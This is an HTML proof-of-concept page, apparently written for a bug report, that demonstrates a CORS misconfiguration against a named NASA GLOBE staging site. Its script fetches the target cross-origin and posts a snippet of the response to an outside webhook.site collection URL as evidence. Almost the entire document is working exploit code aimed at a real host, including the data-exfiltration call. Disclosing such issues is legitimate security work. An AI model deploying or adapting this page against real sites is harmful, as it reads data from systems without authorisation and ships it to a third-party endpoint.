<!DOCTYPE html>
<html>
<head>
  <title>NASA CORS Leak PoC</title>
  <meta charset="UTF-8">
</head>
<body style="background:#111;color:#0f0;font-family:monospace;padding:20px;">
  <h2>Simulating NASA CORS Exploit (No-Creds)...</h2>
  <pre id="output">Loading...</pre>

  <script>
    const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de";

    fetch("https://datasearchstaging.globe.gov/", {
      method: "GET",
      mode: "cors" // no credentials
    })
    .then(res => res.text())
    .then(html => {
      const snippet = html.slice(0, 500);

      // عرض HTML فقط (no cookies)
      document.getElementById("output").innerText =
        "HTML Snippet:\n" + snippet;

      // إرسال إلى Webhook كدليل
      fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          origin: location.origin,
          target: "https://datasearchstaging.globe.gov/",
          html_snippet: snippet
        })
      });
    })
    .catch(error => {
      document.getElementById("output").innerText = "❌ Failed:\n" + error;
    });
  </script>
</body>
</html>
